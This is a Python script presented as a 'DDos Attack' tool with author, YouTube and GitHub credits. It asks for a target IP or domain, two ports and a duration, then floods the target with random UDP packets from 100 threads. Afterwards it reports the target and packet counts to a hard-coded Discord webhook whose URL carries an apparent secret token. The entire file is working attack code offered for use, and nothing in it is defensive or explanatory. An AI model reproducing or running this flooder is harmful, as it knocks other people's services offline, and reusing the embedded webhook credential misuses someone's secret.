import sys
import os
import socket
import random
import threading
import time
import requests
from datetime import datetime

# Get current time
now = datetime.now()
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

# Clear the console
os.system("cls" if os.name == "nt" else "clear")
os.system("figlet DDos Attack")
print()
print("Author : GoT Heartless")
print("You Tube : https://youtube.com/@got-heartless?si=zH2AiLu88XbvGVyU")
print("GitHub : https://github.com/GoTHeartless")
print()

target = input("Enter IP Address or Domain Name: ")
port1 = input("First Port : ")
port2 = input("Second Port : ")

# Convert ports to integers
try:
    port1 = int(port1)
    port2 = int(port2)
except ValueError:
    print("Ports must be integers.")
    sys.exit(1)

# Resolve domain name to IP address if necessary
try:
    ip = socket.gethostbyname(target)
except socket.gaierror:
    print("Invalid IP address or domain name.")
    sys.exit(1)

# Get the duration of the attack from the user
duration = input("Duration of the attack (in seconds): ")

# Convert duration to integer
try:
    duration = int(duration)
except ValueError:
    print("Duration must be an integer.")
    sys.exit(1)

os.system("cls" if os.name == "nt" else "clear")
os.system("figlet Attack Starting")
print("Attack starting...")

sent1 = 0
sent2 = 0
start_time = time.time()  # Record the start time

# Number of threads to create
num_threads = 50  # Set to 50 as requested

def attack(port):
    global sent1, sent2
    end_time = time.time() + duration  # Calculate when to stop
    while time.time() < end_time:
        sock.sendto(bytes, (ip, port))
        if port == port1:
            sent1 += 1
        elif port == port2:
            sent2 += 1

# Create and start threads
threads = []
for _ in range(num_threads):
    thread1 = threading.Thread(target=attack, args=(port1,))
    thread2 = threading.Thread(target=attack, args=(port2,))
    threads.append(thread1)
    threads.append(thread2)
    thread1.start()
    thread2.start()

# Wait for all threads to complete
for thread in threads:
    thread.join()

# Calculate total time taken
end_time = time.time()  # Record the end time
total_time = end_time - start_time  # Calculate the duration

# Print the total time taken
print(f"\nTotal time taken: {total_time:.2f} seconds")

# Optionally, send a notification to a Discord webhook
webhook_url = 'https://discord.com/api/webhooks/1304490243910533172/ceZNHL_lfpNCSL4MF4HbR_l7cam-Q2Sxc3hSL7iRAiA8KNL9TZ8e0ygQfnZ9KSafXQxS'  # Replace with your Discord webhook URL
message = {
    "content": (
        f"Attack completed!\n"
        f"Target: {target} ({ip})\n"
        f"Total packets sent to port {port1}: {sent1}\n"
        f"Total packets sent to port {port2}: {sent2}\n"
        f"Total packets sent: {sent1 + sent2}\n"
        f"Total time taken: {total_time:.2f} seconds"
    )
}

# Send the message to the Discord webhook
try:
    requests.post(webhook_url, json=message)
    print("Notification sent to Discord.")
except Exception as e:
    print(f"Failed to send notification: {e}")
